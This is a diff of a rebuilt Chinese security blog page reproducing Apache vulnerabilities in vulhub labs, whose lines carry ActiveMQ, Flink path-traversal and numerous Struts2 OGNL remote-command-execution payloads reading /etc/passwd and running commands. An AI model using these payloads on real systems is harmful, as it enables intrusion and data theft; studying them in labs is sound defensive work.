@@ -30,7 +30,7 @@ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &#34;touch /tmp/vuln&#34
 <link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
 <meta name=theme-color content="#2e2e33">
 <meta name=msapplication-TileColor content="#2e2e33">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <meta property="og:title" content="Apache漏洞复现">
 <meta property="og:description" content="Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。
 影响版本 Apache Airflow 1.10.3以下版本。
@@ -406,7 +406,7 @@ INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#
 INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> Sent gadget <span style=color:#e6db74>&#34;ROME&#34;</span> with command: <span style=color:#e6db74>&#34;touch /tmp/vuln&#34;</span>
 INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> Shutting down connection ID:&lt;server-id&gt;
 </code></pre></div><p>访问<code>http://&lt;ip>:&lt;port>/admin/browse.jsp?JMSDestination=event</code>查看消息队列，访问页面需要登录，默认账密如下：</p>
-<pre><code>admin/admin
+<pre tabindex=0><code>admin/admin
 </code></pre><p>点击页面<code>Message ID</code>下的<code>ID:server-id</code>字段触发文件创建命令，在受害端查看命令是否执行成功：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ls /tmp
 </code></pre></div><p>确认<code>/tmp/vuln</code>文件存在后即可进一步创建<code>反弹shell</code>。</p>
@@ -436,7 +436,7 @@ INFO d.c.j.t.JMSTarget <span style=color:#f92672>[</span>main<span style=color:#
 <p>2.若不能执行则移动<code>webshell</code>到有权限目录。</p>
 <h2 id=漏洞复现-2>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-2>#</a></h2>
 <p>访问<code>http://&lt;ip>:8161</code>，先登录，默认账密：</p>
-<pre><code>admin/admin
+<pre tabindex=0><code>admin/admin
 </code></pre><p>使用<code>bp</code>构造如下请求包：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PUT /fileserver/a.jsp HTTP/1.1
 Host: &lt;<span style=color:#f92672>ip</span>&gt;:&lt;<span style=color:#f92672>port</span>&gt;
@@ -510,11 +510,11 @@ run <span style=color:#75715e># 执行攻击</span>
 </code></pre></div><h1 id=httpd-多后缀解析漏洞>HTTPd 多后缀解析漏洞<a hidden class=anchor aria-hidden=true href=#httpd-多后缀解析漏洞>#</a></h1>
 <h2 id=漏洞描述-4>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-4>#</a></h2>
 <p><code>Apache HTTPD</code>支持一个文件拥有多个后缀并根据不同后缀执行不同指令，示例配置文件如下：</p>
-<pre><code>AddType text/html .html
+<pre tabindex=0><code>AddType text/html .html
 AddLanguage zh-CN .cn
 </code></pre><p>配置文件给<code>.html</code>后缀增加了<code>media-type</code>，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，若用户请求文件<code>index.cn.html</code>，服务器将返回一个中文<code>html</code>页面。这就是<code>Apache</code>多后缀特性。</p>
 <p>若运维人员给<code>.php</code>后缀增加了处理器：</p>
-<pre><code>AddHandler application/x-httpd-php .php
+<pre tabindex=0><code>AddHandler application/x-httpd-php .php
 </code></pre><p>在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀，那么其将被识别为<code>php</code>文件，利用这个特性我们就可以构造绕过上传限制的解析漏洞。</p>
 <h2 id=复现思路-3>复现思路<a hidden class=anchor aria-hidden=true href=#复现思路-3>#</a></h2>
 <p>修改文件名为<code>xxx.php.jpg</code>绕过文件上传限制。</p>
@@ -561,7 +561,7 @@ DirectoryIndex index.php index.html
 <p><code>FOFA</code>：<code>app="Apache Flink"</code></p>
 <p>环境搭建：<a href=https%EF%BC%9A//github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519>vulhub/flink/CVE-2020-17519 at master · vulhub/vulhub (github.com)</a></p>
 <p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+<pre tabindex=0><code>http://&lt;ip&gt;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
 </code></pre><p>漏洞利用<code>POC</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
 <span style=color:#f92672>import</span> sys
@@ -766,26 +766,26 @@ docker-compose up -d
 <p><code>Struts2 2.0.0 ~ 2.0.11</code></p>
 <h2 id=漏洞复现-14>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-14>#</a></h2>
 <p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;
 http://&lt;ip&gt;:&lt;port&gt;/index.action?&lt;script&gt;alert(1)&lt;/script&gt;test=hello
 </code></pre><h1 id=struts2-s2-003-xwork-parameterinterceptors旁路允许ognl语句执行-cve-2008-6504>Struts2 S2-003 XWork ParameterInterceptors旁路允许OGNL语句执行 CVE-2008-6504<a hidden class=anchor aria-hidden=true href=#struts2-s2-003-xwork-parameterinterceptors旁路允许ognl语句执行-cve-2008-6504>#</a></h1>
 <h2 id=漏洞描述-15>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-15>#</a></h2>
 <p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-003>S2-003 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
 <p><code>OGNL</code>提供了广泛的表达式评估功能，可以使攻击者绕过<code>ParameterInterceptor</code>内置的<code>#</code>使用保护，从而能够操纵服务器端上下文对象。</p>
 <p>如，要将<code>#session.user</code>设置为<code>oopsdc</code>，可以使用以下参数名称：</p>
-<pre><code>('\ u0023'+'session 'user ' ')(未使用)= oopsdc
+<pre tabindex=0><code>('\ u0023'+'session 'user ' ')(未使用)= oopsdc
 </code></pre><p>经<code>URL编码</code>后会如此显示：</p>
-<pre><code>('\ u0023'％20％2b％20'session 'user \ '))(未使用)= oopsdc
+<pre tabindex=0><code>('\ u0023'％20％2b％20'session 'user \ '))(未使用)= oopsdc
 </code></pre><h2 id=影响版本-13>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-13>#</a></h2>
 <p><code>Structs 2.0.0 ~ 2.0.11.2</code></p>
 <h2 id=漏洞复现-15>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-15>#</a></h2>
 <p><code>S2-003</code>算是<code>S2-005</code>的前身，其<code>POC</code>为<code>S2-005</code>的缩小版，因为<code>S2-003</code>之后官方修改了安全配置，默认让<code>SecurityMemberAccess</code>(管理<code>OGNL</code>权限的类)的<code>allowStaticMethodAccessz</code>值为<code>false</code>。</p>
 <p>这里把<code>S2-005</code>的<code>POC</code>去掉<code>&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)</code>这句话。</p>
-<pre><code>?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
+<pre tabindex=0><code>?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
 </code></pre><p>测试<code>URL</code>：</p>
-<pre><code>http://&lt;ip&gt;:8080/showcase.action
+<pre tabindex=0><code>http://&lt;ip&gt;:8080/showcase.action
 </code></pre><p>修改后<code>URL</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/showcase.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/showcase.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&amp;('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&amp;('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&amp;('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&amp;(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&amp;(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&amp;(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&amp;(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&amp;('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
 </code></pre><p>直接执行<code>ipconfig</code>命令。</p>
 <h1 id=struts2-s2-004-提供静态内容时的目录遍历漏洞-cve-2008-6505>Struts2 S2-004 提供静态内容时的目录遍历漏洞 CVE-2008-6505<a hidden class=anchor aria-hidden=true href=#struts2-s2-004-提供静态内容时的目录遍历漏洞-cve-2008-6505>#</a></h1>
 <h2 id=漏洞描述-16>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-16>#</a></h2>
@@ -798,11 +798,11 @@ http://&lt;ip&gt;:&lt;port&gt;/index.action?&lt;script&gt;alert(1)&lt;/script&gt
 <p><code>Apache Struts 2.0.0 ~ 2.1.8.1</code></p>
 <h2 id=漏洞复现-16>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-16>#</a></h2>
 <p>环境搭建：</p>
-<pre><code>gitclone https://github.com/vulhub/vulhub.git
+<pre tabindex=0><code>gitclone https://github.com/vulhub/vulhub.git
 cd vulhub/struts2/s2-005
 docker-compose up -d
 </code></pre><p><code>POC</code>：</p>
-<pre><code>/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27id%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29
+<pre tabindex=0><code>/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27id%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29
 </code></pre><p>更改<code>POC</code>中的<code>id</code>值就能执行任意指令。</p>
 <h1 id=struts2-s2-006-xwork的多个xss生成错误页面>Struts2 S2-006 XWork的多个XSS生成错误页面<a hidden class=anchor aria-hidden=true href=#struts2-s2-006-xwork的多个xss生成错误页面>#</a></h1>
 <h2 id=漏洞描述-18>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-18>#</a></h2>
@@ -843,9 +843,9 @@ docker-compose up -d
 cd vulhub/struts2/s2-008
 docker-compose up -d
 </code></pre></div><p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)
+<pre tabindex=0><code>http://&lt;ip&gt;:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)
 </code></pre><p>回显为<code>null</code>。</p>
-<pre><code>http://&lt;ip&gt;:8080/S2-008/devmode.action?debug=command&amp;expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29
+<pre tabindex=0><code>http://&lt;ip&gt;:8080/S2-008/devmode.action?debug=command&amp;expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29
 </code></pre><p>成功执行<code>id</code>命令。</p>
 <h1 id=struts2-s2-009-parameterintercetptor远程命令执行漏洞>Struts2 S2-009 ParameterIntercetptor远程命令执行漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-009-parameterintercetptor远程命令执行漏洞>#</a></h1>
 <h2 id=漏洞描述-21>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-21>#</a></h2>
@@ -860,9 +860,9 @@ docker-compose up -d
 cd vulhub/struts2/s2-009
 docker-compose up -d
 </code></pre></div><p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/ajax/example5?age=123&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/ajax/example5?age=123&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true
 </code></pre><p>在服务器创建<code>/tmp/success</code>文件，无回显。</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/ajax/example5.action?age=123&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/ajax/example5.action?age=123&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]
 </code></pre><p>执行<code>ls</code>命令并下载结果文件。</p>
 <h1 id=struts-s2-010-使用struts2令牌机制进行csrf保护时可能会因滥用已知会话属性绕过检查>Struts S2-010 使用Struts2令牌机制进行CSRF保护时，可能会因滥用已知会话属性绕过检查<a hidden class=anchor aria-hidden=true href=#struts-s2-010-使用struts2令牌机制进行csrf保护时可能会因滥用已知会话属性绕过检查>#</a></h1>
 <h2 id=漏洞描述-22>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-22>#</a></h2>
@@ -894,15 +894,15 @@ docker-compose up -d
 cd vulhub/struts2/s2-012
 docker-compose up -d
 </code></pre></div><p><code>URL</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp
 </code></pre><p><code>POC</code>：</p>
-<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;, &quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+<pre tabindex=0><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;, &quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 </code></pre><p><code>bp</code>抓包看回显。</p>
 <h1 id=struts2-s2-013-url和锚标记的includeparams属性中存在的远程命令执行漏洞-cve-2013-1966>Struts2 S2-013 URL和锚标记的includeParams属性中存在的远程命令执行漏洞 CVE-2013-1966<a hidden class=anchor aria-hidden=true href=#struts2-s2-013-url和锚标记的includeparams属性中存在的远程命令执行漏洞-cve-2013-1966>#</a></h1>
 <h2 id=漏洞描述-25>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-25>#</a></h2>
 <p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-013>S2-013 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
 <p><code>struts</code>的标签中<code>s:a</code>和<code>s:url</code>都有一个<code>includeParams</code>属性：</p>
-<pre><code>none	:	URL中不包含任何参数(默认)
+<pre tabindex=0><code>none	:	URL中不包含任何参数(默认)
 get		:	仅包含URL中的GET参数
 all		:	在URL中包含GET和POST参数
 </code></pre><p>当<code>includeParams=all</code>的时候，会将本次请求的<code>GET</code>和<code>POST</code>参数都放在<code>URL</code>的<code>GET</code>参数上。
@@ -911,12 +911,12 @@ all		:	在URL中包含GET和POST参数
 <p><code>Struts 2.0.0 ~ 2.3.14</code></p>
 <h2 id=漏洞复现-21>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-21>#</a></h2>
 <p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
 </code></pre><h1 id=struts2-s2-014-强制参数包含在url和锚标记中引入的漏洞允许远程命令执行会话访问操作及xss攻击-cve-2013-1966-cve-2013-2115>Struts2 S2-014 强制参数包含在URL和锚标记中引入的漏洞允许远程命令执行、会话访问操作及XSS攻击 CVE-2013-1966 CVE-2013-2115<a hidden class=anchor aria-hidden=true href=#struts2-s2-014-强制参数包含在url和锚标记中引入的漏洞允许远程命令执行会话访问操作及xss攻击-cve-2013-1966-cve-2013-2115>#</a></h1>
 <h2 id=漏洞描述-26>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-26>#</a></h2>
 <p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-014>S2-014 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
 <p><code>Struts</code>中<code>&lt;s:url></code>和<code>&lt;s:a></code>标签都包含<code>includeParams</code>属性，其值可设为<code>none</code>、<code>get</code>或<code>all</code>，含义如下：</p>
-<pre><code>none	：	链接不包含请求的任意参数值(默认)
+<pre tabindex=0><code>none	：	链接不包含请求的任意参数值(默认)
 get		：	链接只包含GET请求中的参数和值
 all		：	链接包含GET和POST所有参数和值
 </code></pre><p>包含特殊请求参数的请求可用来向堆栈注入任意<code>OGNL</code>代码，被用于<code>URL</code>或<code>A标签</code>中的请求参数。当<code>includeParams=all</code>时，会将本次请求的<code>GET</code>和<code>POST</code>参数都放在<code>URL</code>的<code>GET</code>参数上造成任意命令执行漏洞。</p>
@@ -925,9 +925,9 @@ all		：	链接包含GET和POST所有参数和值
 <p><code>Struts 2.0.0 ~ 2.3.14.1</code></p>
 <h2 id=漏洞复现-22>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-22>#</a></h2>
 <p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
 </code></pre><p>或</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
 </code></pre><h1 id=struts2-s2-015-通配符匹配机制引入的漏洞或ognl表达式的双重评估导致的远程命令执行漏洞-cve-2013-2134-cve-2013-2135>Struts2 S2-015 通配符匹配机制引入的漏洞或OGNL表达式的双重评估导致的远程命令执行漏洞 CVE-2013-2134 CVE-2013-2135<a hidden class=anchor aria-hidden=true href=#struts2-s2-015-通配符匹配机制引入的漏洞或ognl表达式的双重评估导致的远程命令执行漏洞-cve-2013-2134-cve-2013-2135>#</a></h1>
 <h2 id=漏洞描述-27>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-27>#</a></h2>
 <p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-015>S2-015 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
@@ -940,9 +940,9 @@ all		：	链接包含GET和POST所有参数和值
 <p><code>Struts 2.0.0 ~ 2.3.14.2</code></p>
 <h2 id=漏洞复现-23>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-23>#</a></h2>
 <p><code>POC</code>：</p>
-<pre><code>http://&lt;ip&gt;:&lt;port&gt;/example/%25%7B1%2B1%7D.action
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/example/%25%7B1%2B1%7D.action
